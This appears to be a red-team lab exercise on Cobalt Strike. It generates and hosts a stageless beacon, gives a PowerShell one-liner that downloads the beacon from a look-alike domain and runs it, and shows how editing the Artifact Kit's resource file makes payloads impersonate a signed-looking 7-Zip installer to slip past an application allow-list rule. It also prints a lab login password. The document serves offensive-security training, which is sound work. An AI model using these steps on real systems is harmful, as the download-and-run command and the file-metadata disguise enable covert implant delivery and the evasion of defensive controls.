
# Generate and host payload

1. Launch Cobalt Strike and connect to the Team Server.
    
2. Generate a payload.
    
    1. **Payloads > Windows Stageless Payload**
    2. Listener: http
    3. Click **Generate**
    4. Save to _C:\Payloads\beacon_x64.exe_
3. Host the payload.
    
    1. **Site Management > Host File**
    2. File: C:\Payloads\beacon_x64.exe
    3. Local URI: /beacon_x64.exe
    4. Click **Launch**
4. Switch to [Workstation 2](https://labclient.labondemand.com/Instructions/5ebd7e42-e84a-4271-8539-fa53e309479b#) and login with Passw0rd!.
    
5. Download and execute the payload.
    
    powershellTypeCopy
    
    ```
    iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\rsteel\Downloads\beacon_x64.exe" Start-Process -FilePath "C:\Users\rsteel\Downloads\beacon_x64.exe"
    ```

# Solution

```xml
<FileRules>
  <Allow ID="ID_ALLOW_A_1" FriendlyName="Allow 7Zip installer" FileName="7zipInstall.exe" ProductName="7-Zip"/>
</FileRules>
```

We can even modify `resource.rc` in the Artifact Kit so that all the binary payloads built by Cobalt Strike has these attributes. Simply change _OriginalFilename_ and _ProductName_ to the required values (you can also change the others to match a legitimate 7Zip installer file), for example:

```
#define VER_FILEVERSION             25,0,0,1
#define VER_FILEVERSION_STR         "25,0,0,1\0"
 
#define VER_PRODUCTVERSION          25,0,0,1
#define VER_PRODUCTVERSION_STR      "25,0,0,1\0"

BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "Igor Pavlov"
            VALUE "FileDescription", "7-Zip Installer"
            VALUE "FileVersion", "25.1.0.0"
            VALUE "InternalName", "7-Zip"
            VALUE "LegalCopyright", "Copyright (c) 1999-2025 Igor Pavlov"
            VALUE "OriginalFilename", "7zipInstall.exe"
            VALUE "ProductName", "7-Zip"
            VALUE "ProductVersion", "25.01"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1266
    END
END

IDI_ICON1               ICON                    "src-main/7zip.ico"
```

Build the kit and load the Aggressor script into Cobalt Strike.

```
$ ./build.sh mailslot HeapAlloc 344564 0 true false none /mnt/c/Tools/cobaltstrike/artifacts
```

Then generate a new executable payload and it will have the required file attributes to bypass this rule.
